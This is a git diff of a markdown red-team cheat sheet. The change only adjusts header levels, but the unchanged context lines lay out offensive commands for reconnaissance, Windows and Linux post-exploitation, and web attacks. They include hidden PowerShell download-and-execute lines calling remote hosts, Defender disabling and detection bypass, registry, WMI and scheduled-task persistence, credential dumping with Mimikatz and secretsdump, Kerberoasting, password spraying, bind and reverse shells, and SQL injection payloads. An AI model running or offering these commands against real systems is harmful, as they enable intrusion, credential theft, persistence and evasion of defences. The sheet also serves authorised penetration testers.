@@ -25,13 +25,13 @@ Password Breach Database, requires subscription
 
 https://leakbase.pw/
 
-## FOCA
+### FOCA
 
-## Maltego
+### Maltego
 
-## ReconNG
+### ReconNG
 
-## Metagoofil
+### Metagoofil
 
 Source: http://resources.infosecinstitute.com/kali-reporting-tools/#gref
 
@@ -49,7 +49,7 @@ Perform document metadata searching on target domain using first 200 google resu
     metagoofil -d <target>.com -t pdf,doc,xls,ppt,odp,ods,docx,xlsx,pptx -l 200 -n 5 -o /tmp/metagoofil/ -f /tmp/metagoofil/result.html
 ```
 
-## censys.io
+### censys.io
 
 Censys is a search engine that allows computer scientists to ask questions about the devices and networks that compose the Internet. Driven by Internet-wide scanning, Censys lets researchers find specific hosts and create aggregate reports on how devices, websites, and certificates are configured and deployed.
 
@@ -70,9 +70,9 @@ Python API
                 print result["ip"] + "," + port
 ```
 
-# Network Scanning
+## Network Scanning
 
-## dsnrecon
+### dsnrecon
 
 Normal dns reverse lookup of IP range with CSV output
 ``` 
@@ -128,7 +128,7 @@ Perform zone transfer attempt
        -v                           Show attempts in the brute force modes.
 ```
 
-## TheHarvester
+### TheHarvester
 
 Perform lookup against <domain> with additional DNS reverse on all ranges discovered
 ```
@@ -159,7 +159,7 @@ Perform lookup against <domain> with additional DNS reverse on all ranges discov
             theharvester -d apple.com -b googleCSE -l 500 -s 300
 ```
 
-## Nmap 
+### Nmap 
 https://github.com/bluscreenofjeff/CCDC-Scripts/blob/master/OpsPlan2016.txt
 
 Host discovery
@@ -211,7 +211,7 @@ HTTP Scan
         nmap -vv -sS -Pn-n -p80,443,8080 --script=http-vhosts,http-userdir-enum,http-apache-negotiation,http-backup-finder,http-config-backup,http-default-accounts,http-email-harvest,http-methods,http-method-tamper,http-passwd,http-robots.txt <targets> -oA <outfile>
     ```
 
-### IDS Evasion
+#### IDS Evasion
 
 Append extra random data to change default packet lengths
 ```
@@ -223,9 +223,9 @@ Randomize scan order
     -randomize-hosts
 ```
 
-## Web
+### Web
 
-### Eyewitness
+#### Eyewitness
 Get the most recent version
 ```
     git clone https://github.com/ChrisTruncer/EyeWitness.git
@@ -305,9 +305,9 @@ Response (on Collaborator):
 
 ---
 
-# Windows
+## Windows
 
-## Built-in Commands
+### Built-in Commands
 
 View your current user:
 ```
@@ -622,7 +622,7 @@ Lock a file for testing
     (>&2 pause) >> file.txt
 ```
 
-### DSQUERY
+#### DSQUERY
 
 Get attributes for all Windows hosts in the Domain
 ``` 
@@ -658,7 +658,7 @@ Get Forest Functional Level
     dsquery * "CN=Partitions,CN=Configuration,DC=corp,DC=test,DC=com" -scope base -attr msDS-Behavior-Version ntMixedDomain
 ````
 
-### SQLCMD
+#### SQLCMD
 
 List Databases
 ```
@@ -680,33 +680,33 @@ Dump MSSQL Password Hashes
     sqlcmd -E -S localhost -Q "SELECT name, password_hash FROM master.sys.sql_logins;"
 ```
 
-### NTDSUTIL
+#### NTDSUTIL
 Built-in utility to create backup copy of the AD database
 ``` 
     ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
 ```
 
-### Applocker
+#### Applocker
 List Applocker's effective policy on the system
 ```
     Get-ApplockerPolicy -Effective
 ```
 
-### Windows Defender
+#### Windows Defender
 
 Remove definitions and disable AV protection (Useful when Powershell scripts are being blocked by Defender)
 ```
     c:\program files\windows defender\mpcmdrun.exe" -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true
 ```
 
-### APPCMD
+#### APPCMD
 
 Get virtual directories in IIS
 ```
     c:\windows\system32\inetsrv\appcmd.exe list vdir /text:physicalpath
 ```
 
-## Windows Lateral Movement
+### Windows Lateral Movement
 
 RDP Hijacking
 
@@ -764,14 +764,14 @@ PowerShell Remoting over SSH
     reg delete \\<systemname>\<KEY> /v "<value>"
 ```
 
-#### Userinit Key
+##### Userinit Key
 This key specifies what program should be launched right after a user logs into Windows. The default program for this key is C:\windows\system32\userinit.exe. Userinit.exe is a program that restores your profile, fonts, colors, etc for your user name. It is possible to add further programs that will launch from this key by separating the programs with a comma.
 ``` 
     HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
     HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit = (REG_SZ) C:\windows\system32\userinit.exe,c:\windows\badprogram.exe
 ```
 
-#### Run Key
+##### Run Key
 ``` 
     #System Wide
     HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
@@ -782,12 +782,12 @@ This key specifies what program should be launched right after a user logs into 
     HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
 ```
 
-#### List Image File Execution Options (Debugger file executed when the target file is run)
+##### List Image File Execution Options (Debugger file executed when the target file is run)
 ``` 
     HKLM\Software\MS\WindowsNT\CurrentVersion\Image File Execution Options\notepad.exe\debugger(REG_SZ = cmd.exe)
 ```
 
-#### AppInit_DLLs 
+##### AppInit_DLLs 
 Load custom DLLs each time a program runs (If it loads USER32.dll).  This is checked by most AV!
 
 This value corresponds to files being loaded through the AppInit_DLLs Registry value. The AppInit_DLLs registry value contains a list of dlls that will be loaded when user32.dll is loaded. As most Windows executables use the user32.dll, that means that any DLL that is listed in the AppInit_DLLs registry key will be loaded also. This makes it very difficult to remove the DLL as it will be loaded within multiple processes, some of which can not be stopped without causing system instability. The user32.dll file is also used by processes that are automatically started by the system when you log on. This means that the files loaded in the AppInit_DLLs value will be loaded very early in the Windows startup routine allowing the DLL to hide itself or protect itself before we have access to the system.
@@ -795,7 +795,7 @@ This value corresponds to files being loaded through the AppInit_DLLs Registry v
     HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Windows\AppInit_DLLs
 ```
 
-#### No-reboot sethc/utilman option using a "debugger" key  
+##### No-reboot sethc/utilman option using a "debugger" key  
 
 Navigate to HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\
 Make key called "sethc.exe"
@@ -813,9 +813,9 @@ Remove the debugger key
     reg delete "\\hostname\HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /f
 ```
 
-### File Storage Locations
+#### File Storage Locations
 
-#### Startup Folders
+##### Startup Folders
 ``` 
     #All Users - Windows XP
     C:\Documents and Settings\All Users\Start Menu\Programs\Startup
@@ -830,7 +830,7 @@ Remove the debugger key
     C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 ```
 
-#### SETHC/UTILMAN Replacement
+##### SETHC/UTILMAN Replacement
 
 Replace these binaries, may require a reboot to take effect
 ```
@@ -842,7 +842,7 @@ Hit shift 5 times = sethc.exe run by SYSTEM
 Windows key + U = utilman.exe run by SYSTEM
 
 
-#### Volume Shadow Copy (Restore Points)
+##### Volume Shadow Copy (Restore Points)
 
 Windows service that's constantly running - takes snapshots of system directories
 
@@ -853,7 +853,7 @@ Registry Key to Disable Volume Shadow Copy
     HKLM\System\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot
 ```
 
-#### VSSADMIN - native windows utility
+##### VSSADMIN - native windows utility
     
 vssadmin create command only applies to Server OS (Win2k3,2008)  
 ```
@@ -864,7 +864,7 @@ vssadmin create command only applies to Server OS (Win2k3,2008)
     copy \\?\GLOBALROOT\Device\HardDiskVolumeShadowCopy4\path\to\some\file e:\files  
 ```
 
-#### Use WMIC process call to run an .exe from a Volume Shadow Copy
+##### Use WMIC process call to run an .exe from a Volume Shadow Copy
 ```
     wmic process call create \\.\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\evil.exe
 ```
@@ -883,9 +883,9 @@ In Kali Linux you could use the WMIS package to do the same thing:
 ```
 
 
-### Task Scheduling
+#### Task Scheduling
 
-#### AT
+##### AT
 Executes as system and must be an Admin to run it. Check groups with whoami /groups
 ```
     at 13:20 /interactive cmd
@@ -895,7 +895,7 @@ Executes as system and must be an Admin to run it. Check groups with whoami /gro
     at \\target 13:20 c:\temp\evil.bat
 ```
 
-#### SCHTASKS
+##### SCHTASKS
 Any user can create a task
 
 Schedule a binary to run with arguments on system events
@@ -934,7 +934,7 @@ Use the Powershell Web Delivery (Download and Execute) module in Metasploit 'exp
     schtasks /create /tn OfficeUpdaterC /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onidle /i 30
 ```
 
-#### Additional Notes
+##### Additional Notes
 
 Scheduled Tasks binary paths CANNOT contain spaces because everything after the first space in the path is considered to be a command-line argument. To workaround this behavior, enclose the /TR path parameter between backslash (\) AND quotation marks ("):
 
@@ -956,14 +956,14 @@ View scheduled tasks log (for troubleshooting)
     
 ```
 
-### Windows Service
+#### Windows Service
 ```
     sc query
     sc create <\\Target(optional)> <servicename> binPath= <service binary path> type= share start= auto DisplayName= <display name>
     sc delete <servicename>
 ```
 
-### DLL-Hijacking
+#### DLL-Hijacking
 
 Order of DLL Loading
 ```
@@ -1027,14 +1027,14 @@ Windows 8.1 there are also three executables that could be exploited and associa
     C:\Program Files\Common Files\microsoft shared\ink\OLEACC.dll
 ```
 
-#### linkinfo.dll Replacement
+##### linkinfo.dll Replacement
 
 Windows explorer in older systems loads linkinfo.dll from c:\windows over c:\windows\system32 if it exists
 ```
     copy evil.dll c:\windows\linkinfo.dll
 ```
 
-### WMI Event Persistence via Powershell
+#### WMI Event Persistence via Powershell
 WMI Event persistence explained, you can find a bloated version in powersploit.
 Three parts to this: 
 * WMI Event Filter
@@ -1043,7 +1043,7 @@ Three parts to this:
 This technique gets you *SYSTEM* level persistence, requires admin rights to execute.
 Autoruns doesn't even check for this yet. (doubt any AVs are either)
 Difficult to detect, Difficult to remove if you dont know what youre doing.
-#### WMI Event Filter
+##### WMI Event Filter
 Create an event that checks every 60 seconds for a change in Win32_PerfFormattedData_PerfOS_System. (this is always changing)
 
 ```    
@@ -1058,7 +1058,7 @@ Create an event that checks every 60 seconds for a change in Win32_PerfFormatted
 
 http://msdn.microsoft.com/en-us/library/aa394639(v=vs.85).aspx
 
-#### Event Consumer
+##### Event Consumer
 Configure what to execute once the event occurs.
 Current example is just a ping.
 
@@ -1074,7 +1074,7 @@ Current example is just a ping.
 http://msdn.microsoft.com/en-us/library/aa389231(v=vs.85).aspx
 http://msdn.microsoft.com/en-us/library/aa393649(v=vs.85).aspx
 
-#### Filter/Consumer Binding
+##### Filter/Consumer Binding
 This is the object that correlates the Filter with the Consumer.
 Runs as system as a child of WmiPrvSE.exe under the svchost.exe running Dcom service.
 
@@ -1087,7 +1087,7 @@ Runs as system as a child of WmiPrvSE.exe under the svchost.exe running Dcom ser
 
 http://msdn.microsoft.com/en-us/library/aa394647(v=vs.85).aspx
 
-#### REMOVAL
+##### REMOVAL
 The filter name would change depending on what you call the wmi event on your target (OBVIOUSHACKER shown as the example)
 
 ```
@@ -1101,13 +1101,13 @@ The filter name would change depending on what you call the wmi event on your ta
 http://www.bleepingcomputer.com/tutorials/windows-program-automatic-startup-locations/
 
 
-### Malicious Outlook Rules
+#### Malicious Outlook Rules
 
 * https://labs.mwrinfosecurity.com/blog/malicous-outlook-rules/
 * Ruler
  - https://github.com/sensepost/ruler
 
-### Windows Remote Management (WinRM) / PSRemoting
+#### Windows Remote Management (WinRM) / PSRemoting
 
 * Listens on 5985/5986 by default and allows interactive shell access over HTTP/S
 * Find by scanning for /wsman and looking for HTTP 402 errors (or use Metasploit module)
@@ -1123,15 +1123,15 @@ http://www.bleepingcomputer.com/tutorials/windows-program-automatic-startup-loca
     Invoke-Command -ComputerName <host> -ScriptBlock { gci c:\ } -credential $cred
 ```
 
-### Uninstall a patch to leave the system vulnerable
+#### Uninstall a patch to leave the system vulnerable
 ``` 
     wusa.exe /uninstall /kb:976932
 ```
 
-### Create custom DLL for password filters and install on DC to capture changed passwords  
+#### Create custom DLL for password filters and install on DC to capture changed passwords  
 * http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html
 
-## Application Whitelisting Bypass Techniques
+### Application Whitelisting Bypass Techniques
 
 [SubTee Collection of Whitelist Bypass Techniques ](https://github.com/subTee/ApplicationWhitelistBypassTechniques/blob/master/TheList.txt)
 https://bitbucket.org/jsthyer/wevade.git
@@ -1184,7 +1184,7 @@ https://www.defcon.org/images/defcon-21/dc-21-presentations/Bialek/DEFCON-21-Bia
     http://subt0x10.blogspot.com/2016/09/bypassing-application-whitelisting.html
 ```
 
-## Certutil
+### Certutil
 
 https://gist.github.com/subTee/7937a8ef07409715f15b84781e180c46
     
@@ -1193,9 +1193,9 @@ File download
     certutil -urlcache -split -f http://example.com/file 
 ```
 
-## Active Directory Enumeration
+### Active Directory Enumeration
 
-### Adfind
+#### Adfind
 
 www.joeware.net/freetools/tools/adfind/
 ```
@@ -1206,7 +1206,7 @@ www.joeware.net/freetools/tools/adfind/
     AdFind.exe -u account@domain.com -up pass -h 10.4.128.40:389 -b dc=domain,dc=com -f "objectcategory=user" samaccountname description pwdlastset orclcommonattribute > domain_users_light.txt
 ```
 
-## Powershell
+### Powershell
 
 List help for cmdlet: `Get-Help [cmdlet] -full`
 
@@ -1304,24 +1304,24 @@ Get unquoted service paths
     gwmi win32_service |Select pathname | Where {($_.pathname -ne $null)} | Where {-not $_.pathname.StartsWith("`"")} | Where {($_.pathname.Substring(0, $_.pathname.IndexOf(".") +4)) -match ".* .*"}
 ```
 
-### Find-Files (custom)
+#### Find-Files (custom)
 ```
     Find-Files -searchBase "i:\" -searchTerms "*web.xml*,*web.config*,*password*,*tomcat-users.xml*" -LogPath "C:\Users\username\AppData\Local\Temp"
 ```
 
-### Get-Enumeration (custom)
+#### Get-Enumeration (custom)
 
 Run Local and Domain enumeration functions on the local host.
 ``` 
     Get-Enumeration -Path . -Local -Domain
 ```
 
-### Download and execute IEX
+#### Download and execute IEX
 ```
     powershell -nop -w hidden -c "iex (New-Object Net.WebClient).DownloadString('http://192.168.1.1:80/file')" 
 ```
 
-### EncodedCommand and IEX detection bypass
+#### EncodedCommand and IEX detection bypass
 
 Author: Dave Kennedy
 Source: https://www.trustedsec.com/blog/circumventing-encodedcommand-detection-powershell/
@@ -1336,14 +1336,14 @@ Avoid detection of IEX
     powershell -window hidden -C "set-variable -name "LB" -value "I"; set-variable -name "I" -value "E"; set-variable -name "V" -value "X"; set-variable -name "wP" -value ((get-variable LB).value.toString()+(get-variable I).value.toString()+(get-variable V).value.toString()) ; powershell (get-variable wP).value.toString() ('<YOURINVOKEEXPRESSIONSTUFFHERE>')"
 ```
 
-### Bloodhound
+#### Bloodhound
 ```
     iex((new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/PowerShell/BloodHound.ps1'));Invoke-Bloodhound -CSVFolder c:\temp -CSVPrefix <prefix>
 
     Invoke-BloodHound -DomainController <domain IP> -Domain <FQDN> -CSVFolder C:\users\public\libraries -CSVPrefix <prefix> -CollectionMethod Stealth
 ```
 
-### Mimikittenz
+#### Mimikittenz
 https://github.com/putterpanda/mimikittenz
 
 mimikittenz is a post-exploitation powershell tool that utilizes the Windows function ReadProcessMemory() in order to extract plain-text passwords from various target processes.
@@ -1369,7 +1369,7 @@ Customizations
 ```
 
 
-### PowerUp
+#### PowerUp
 Performs multiple local host privilege escalation checks for common Windows misconfigurations. 
 ```
     Invoke-AllChecks
@@ -1377,7 +1377,7 @@ Performs multiple local host privilege escalation checks for common Windows misc
 
 [See cheat sheet for more commands](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerUp.pdf)
 
-### PowerView
+#### PowerView
 
 * Requires domain user privileges
     
@@ -1448,7 +1448,7 @@ Get Users & Computers Trusted for Delegation
     Get-DomainComputer -TrustedtoAuth -Properties distinguisedname,useraccountcontrol,msds-allowedtodelegateto|fl
 ```
 
-#### net * Functions:
+##### net * Functions:
 ```
     Get-NetDomain                   -   gets the name of the current user's domain
     Get-NetForest                   -   gets the forest associated with the current user's domain
@@ -1480,7 +1480,7 @@ Get Users & Computers Trusted for Delegation
                                         specified 'PropertyValue'
 ```
 
-#### GPO functions
+##### GPO functions
 ```
     Get-GptTmpl                     -   parses a GptTmpl.inf to a custom object
     Get-NetGPO                      -   gets all current GPOs for a given domain
@@ -1493,7 +1493,7 @@ Get Users & Computers Trusted for Delegation
     Get-DomainPolicy                -   returns the default domain or DC policy
 ```
 
-#### User-Hunting Functions:
+##### User-Hunting Functions:
 ```
     Invoke-UserHunter               -   finds machines on the local domain where specified users are logged into, and can optionally check if the current user has local admin access to found machines
     Invoke-StealthUserHunter        -   finds all file servers utilizes in user HomeDirectories, and checks the sessions one each file server, hunting for particular users
@@ -1501,7 +1501,7 @@ Get Users & Computers Trusted for Delegation
     Invoke-UserEventHunter          -   hunts for user logon events in domain controller event logs
 ```
 
-#### Domain Trust Functions:
+##### Domain Trust Functions:
 ```
     Get-NetDomainTrust              -   gets all trusts for the current user's domain
     Get-NetForestTrust              -   gets all trusts for the forest associated with the current user's domain
@@ -1510,7 +1510,7 @@ Get Users & Computers Trusted for Delegation
     Invoke-MapDomainTrust           -   try to build a relational mapping of all domain trusts
 ```
 
-#### MetaFunctions:
+##### MetaFunctions:
 ```
     Invoke-ShareFinder              -   finds (non-standard) shares on hosts in the local domain
     Invoke-FileFinder               -   finds potentially sensitive files on hosts in the local domain
@@ -1524,7 +1524,7 @@ Get Users & Computers Trusted for Delegation
 [HarmJ0y PowerView Cheat Sheet PDF](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf)
 [HarmJ0y's PowerView 2.0 Tricks Gist](https://gist.github.com/HarmJ0y/3328d954607d71362e3c)
 
-### Inveigh
+#### Inveigh
 https://github.com/Kevin-Robertson/Inveigh
 
 Inveigh is a Windows PowerShell LLMNR/NBNS spoofer/man-in-the-middle tool designed to assist penetration testers that find themselves limited to a Windows system. 
@@ -1546,11 +1546,11 @@ Inveigh is a Windows PowerShell LLMNR/NBNS spoofer/man-in-the-middle tool design
 * Granular control of console and file output  
 * Run time control  
 
-### Powershell W/out Powershell
+#### Powershell W/out Powershell
 * MsBuild.exe
 https://gist.githubusercontent.com/subTee/6b236083da2fd6ddff216e434f257614/raw/a224d1edd3453cc321c63aaeefd2b59ea00622a2/pshell.xml
 
-### Get-IndexedItem
+#### Get-IndexedItem
 
 Gets files which have been indexed by Windows desktop search. Searches the Windows index on the local computer or a remote file serving computer looking for file properties or free text searching over contents 
 
@@ -1558,11 +1558,11 @@ Sources:
 https://gallery.technet.microsoft.com/scriptcenter/Get-IndexedItem-PowerShell-5bca2dae
 https://github.com/adaptivethreat/Empire/blob/master/data/module_source/collection/Get-IndexedItem.ps1
 
-### Interacting w/ Windows API
+#### Interacting w/ Windows API
 
 https://blogs.technet.microsoft.com/heyscriptingguy/2013/06/25/use-powershell-to-interact-with-the-windows-api-part-1/
 
-#### Example - Lock Workstation and MessageBox 
+##### Example - Lock Workstation and MessageBox 
 ```
     Add-Type -TypeDefinition @"
     using System;
@@ -1591,7 +1591,7 @@ List static methods
     [USER32] |get-member -static
 ```
 
-### MailSniper (OWA and Exchange Enumeration)
+#### MailSniper (OWA and Exchange Enumeration)
 
 Source: https://github.com/dafthack/MailSniper
 
@@ -1609,7 +1609,7 @@ Bypassing Dual Factor Authentication on OWA - http://www.blackhillsinfosec.com/?
 
 - After the credentials have been entered MailSniper will attempt to connect to the EWS URL at https://mail.domain.com/EWS/Exchange.asmx and search the user’s inbox for key terms (by default “*pass*”, “*creds*”, and “*credentials*”).
 
-#### Locate OWA instances via Autodiscover using only organization primary domain name
+##### Locate OWA instances via Autodiscover using only organization primary domain name
 ``` 
     <smtp-mail-domain>/Autodiscover/Autodiscover.xml
     
@@ -1638,13 +1638,13 @@ Bypassing Dual Factor Authentication on OWA - http://www.blackhillsinfosec.com/?
     ;; MSG SIZE  rcvd: 83
 ```
 
-### DomainPasswordSpray (Internal Windows Domain Password Brute Forcing)
+#### DomainPasswordSpray (Internal Windows Domain Password Brute Forcing)
 
 Source: https://github.com/dafthack/DomainPasswordSpray
 
 DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. BE VERY CAREFUL NOT TO LOCKOUT ACCOUNTS!
 
-#### Quick Start Guide
+##### Quick Start Guide
 Open a PowerShell terminal from the Windows command line with 'powershell.exe -exec bypass'.
 ```
     Type 'Import-Module Invoke-DomainPasswordSpray.ps1'.
@@ -1662,7 +1662,7 @@ The following command will use the userlist at users.txt and try to authenticate
     PowerShell Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
 ```
 
-#### Invoke-DomainPasswordSpray Options
+##### Invoke-DomainPasswordSpray Options
 ```
     UserList          - Optional UserList parameter. This will be generated automatically if not specified.
     Password          - A single password that will be used to perform the password spray.
@@ -1671,7 +1671,7 @@ The following command will use the userlist at users.txt and try to authenticate
     Domain            - A domain to spray against.
 ```
 
-### Misc Powershell Pasties
+#### Misc Powershell Pasties
 
 List Removeable Drives
 ```
@@ -1685,7 +1685,7 @@ $docs = $visio.Documents.Add("")
 $docs.ExecuteLine('CreateObject("Wscript.Shell").Exec("cmd.exe")')
 ```
 
-## Mimikatz
+### Mimikatz
 
 https://github.com/gentilkiwi/mimikatz/wiki
 https://adsecurity.org/?p=2362
@@ -1773,7 +1773,7 @@ Detecting Golden Ticket use on a DC
     </QueryList>
 ```
 
-## Kerberoast
+### Kerberoast
 https://github.com/nidem/kerberoast
 https://room362.com/post/2016/kerberoast-pt1/
 https://room362.com/post/2016/kerberoast-pt2/
@@ -1800,7 +1800,7 @@ Cracking the hashes
     ./john --format=krb5tgs spns.dump --wordlist=
 ```
 
-## Domain Admin Privesc Methods
+### Domain Admin Privesc Methods
 https://adsecurity.org/?p=2362
 
  1. Passwords in SYSVOL & Group Policy Preferences
@@ -1819,7 +1819,7 @@ https://adsecurity.org/?p=2362
     * With admin rights to virtualization host, a virtual DC can be cloned and the associated data copied offline.
 
 
-# Command and Control
+## Command and Control
 
 Simple TCP Port Redirection
 ``` 
@@ -1842,12 +1842,12 @@ Save as a file like the following as redirect.html and map to root "/" on your T
     </html>
 ```
 
-## Domain Fronting
+### Domain Fronting
 
 * https://github.com/rvrsh3ll/FindFrontableDomains
 
 
-## Cobalt Strike
+### Cobalt Strike
 
 http://blog.cobaltstrike.com/2016/07/06/gettin-down-with-aggressor-script/
 https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/DA-Watch.cna
@@ -1861,7 +1861,7 @@ https://github.com/Und3rf10w/Aggressor-scripts
     powerpick iwmi -class Win32_Process -name create -ArgumentList "rundll32.exe c:\users\public\libraries\smb_beacon.dll.log0,StartW"
 ```
 
-### OPSEC Considerations for Beacon Commands
+#### OPSEC Considerations for Beacon Commands
 [Blog.Cobaltstrike.com - OPSEC Considerations For Beacon Commands](https://blog.cobaltstrike.com/2017/06/23/opsec-considerations-for-beacon-commands/#respond)
 
 A good operator knows their tools and has an idea of how the tool is accomplishing its objectives on their behalf. This blog post surveys Beacons commands and provides background on which commands inject into remote processes, which commands spawn jobs, and which commands rely on cmd.exe or powershell.exe.
@@ -1999,17 +1999,17 @@ The following internal Beacon commands create a service (either on the current h
     psexec_psh
 ```
 
-### Powershell Function Wrapper
+#### Powershell Function Wrapper
 
 https://github.com/bluscreenofjeff/AggressorScripts/blob/master/powershell.cna
 https://bluescreenofjeff.com/2016-09-07-adding-easy-guis-to-aggressor-scripts/
 
-### Persistence Scripts
+#### Persistence Scripts
 
 https://github.com/ZonkSec/persistence-aggressor-script
 https://github.com/ZonkSec/persistence-aggressor-script/blob/master/persistence.cna
 
-## EMPIRE
+### EMPIRE
 
 Cheat sheets 
 ``` 
@@ -2056,7 +2056,7 @@ Start with REST API for use with Empire Web
     ./empire --rest --username admin --password <PASSWORD> --restport 1337
 ```
 
-### C2 Profiles
+#### C2 Profiles
 
 Edit default client settings in `/setup/setup_database.py`
 
@@ -2065,9 +2065,9 @@ Example Default Profile
     "/CWoNaJLBo/VTNeWw11212/|Mozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.1)|Accept:image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*|Accept-Language:en-en"
 ```
 
-# Linux
+## Linux
 
-## BASH
+### BASH
 
 BASH loop example
 ```
@@ -2109,7 +2109,7 @@ Create NTLM Hash from Mac CLI
     echo -n password | iconv -t UTF-16LE | openssl md4
 ```
 
-## Linux Persistence Ideas
+### Linux Persistence Ideas
 ```
     Cron
     Add SSH keys
@@ -2117,7 +2117,7 @@ Create NTLM Hash from Mac CLI
     Add init script (reboot persistence)
 ```
 
-## rpcclient
+### rpcclient
 
 http://pen-testing.sans.org/blog/2013/07/24/plundering-windows-account-info-via-authenticated-smb-sessions
 ```
@@ -2142,14 +2142,14 @@ Pass the Hash Variant
     pth-rpcclient -U "domain\name%hash" --pw-nt-hash 10.4.128.41
 ```
 
-## enum4linux 
+### enum4linux 
 
 Domain Controller Anonymous Enumeration
 ```
     enum4linux -A <ip> | tee <ip>-anon-enum.txt
 ```
 
-## iptables
+### iptables
 
 *Append rules to top of the Input filter and make persistent*
 ```
@@ -2164,7 +2164,7 @@ Domain Controller Anonymous Enumeration
     iptables -D INPUT -i eth0 -p tcp --dport 443 -j ACCEPT
 ```
 
-## ldapsearch
+### ldapsearch
 
 Obtain LAPS passwords for domain computers using the linux based ldapsearch tool
 
@@ -2180,7 +2180,7 @@ Obtain LAPS passwords for domain computers using the linux based ldapsearch tool
     ms-MCS-AdmPwd - Only show me the ms-MCS-AdmPwd object (which by default includes the object name and DN so you will still know what host it belongs to)
 ```
 
-## NFS
+### NFS
 
 List NFS Mounts on remote host
 ```
@@ -2199,9 +2199,9 @@ Check NFS share counts in a loop
     done
 ```
 
-## Shells
+### Shells
 
-### TTY Shells
+#### TTY Shells
 
 http://pentestmonkey.net/blog/post-exploitation-without-a-tty
 
@@ -2242,7 +2242,7 @@ Upgrade your shell to a full TTY
     !sh
 ```
 
-### Bind Shells
+#### Bind Shells
 
 https://github.com/infodox/exploits/blob/master/payloads/linux/perl.py
     
@@ -2251,7 +2251,7 @@ Perl Bind Shell (Port 1000)
     perl -e 'use Socket;$p=10000;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S, SOMAXCONN);for(; $p= accept(C, S); close C) {open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/usr/bin/bash -i");};'
 ```
 
-### Reverse Shells
+#### Reverse Shells
 
 Bash
 Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):
@@ -2319,7 +2319,7 @@ your’ll need to authorise the target to connect to you (command also run on yo
     xhost +targetip
 ```
 
-## SSH Tunnels
+### SSH Tunnels
 
 Send data over ssh to port 9000 on target
 
@@ -2341,11 +2341,11 @@ Start ssh using existing connections
     ControlPath ~/.ssh/control:%h:%p:%r
 ```
 
-## Impacket
+### Impacket
 
 Source: https://github.com/CoreSecurity/impacket/releases/tag/impacket_0_9_15
 
-### Install impacket on Windows
+#### Install impacket on Windows
 ```
     git clone https://github.com/CoreSecurity/impacket.git
 ```
@@ -2364,7 +2364,7 @@ You can also download the PyCrypto binary if it fails to compile
 
 - http://www.voidspace.org.uk/downloads/pycrypto26/pycrypto-2.6.win32-py2.7.exe
 
-### Secretsdump
+#### Secretsdump
 
 Attempt to dump credentials from a remote machine via Pass the Hash
 ```
@@ -2376,7 +2376,7 @@ Dump domain password hashes remotely via Volume Shadow Copy
     c:\users\username\appdata\local\temp\sd.exe domain/username:password@dchostname -just-dc -use-vss -outputfile
 ```
 
-### GetUserSPNS.py
+#### GetUserSPNS.py
 
 This is the easiest way to gather SPN tickets in the correct format for cracking with John or Hashcat
 Source: https://room362.com/post/2016/kerberoast-pt2/
@@ -2394,11 +2394,11 @@ Source: https://room362.com/post/2016/kerberoast-pt2/
     $krb5tgs$23$*uberuser$SITTINGDUCK.INFO$SPN*$27c08ed2a8d5394f66e8c13c25c98393$310b787ec5c10b20fcc0acb1406b6a6e2ffddd71de3dc4c70c19e5dfcf262cc88574e61cb3940ebfd574b2bb555f2b05f84d8526e3cf46fc0ca57e03467729757cbf79da9f55cde9dabdda68e80dce6564e9f1b904b0585dbc813b82abf89e973e41c102b664f4c649f85acaf7904a273dddcb9315a66f27334f313190e1caf4f5055b671d250f5912cc1871a1dd4a6126087ddfb98ade8f7dde495ee8ad76583aa5a12eef63a690dd82a15eaaca0d7594f2f1dbc899035d89dd628b291590058cfb3405d1dfe4a383be5704465d9c8972ef8f1cba3541fdfa7dcf5063eaed74051fa18bd73f7b4f7d77
 ```
 
-### SMBRelayx.py
+#### SMBRelayx.py
 
 https://pen-testing.sans.org/blog/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python/?utm_medium=Social&utm_source=Twitter&utm_content=SANSPenTest+BLOG+SMB+Relay+Demystified&utm_campaign=SANS+Pen+Test
 
-## Brute Force Techniques
+### Brute Force Techniques
 
 RDP Brute
 ```
@@ -2415,10 +2415,10 @@ Telnet Brute
     medusa -M telnet -C /usr/share/wordlists/telnet.lst -H 23.txt -T 10 -t 3| grep SUCCESS |tee medusa-results.txt
 ```
 
-# Web Exploitation
-## SQL
+## Web Exploitation
+### SQL
 
-### SQLi Examples
+#### SQLi Examples
 ```
     secret' or 1=1 limit1;#
     #Find number of columns return by the Select statement
@@ -2444,7 +2444,7 @@ Telnet Brute
     ?id=738 union select 1,2,3,4,concat(name,0x3a,password),6 FROM users
 ```
 
-#### SQL Joins
+##### SQL Joins
 ```
     #FULL All
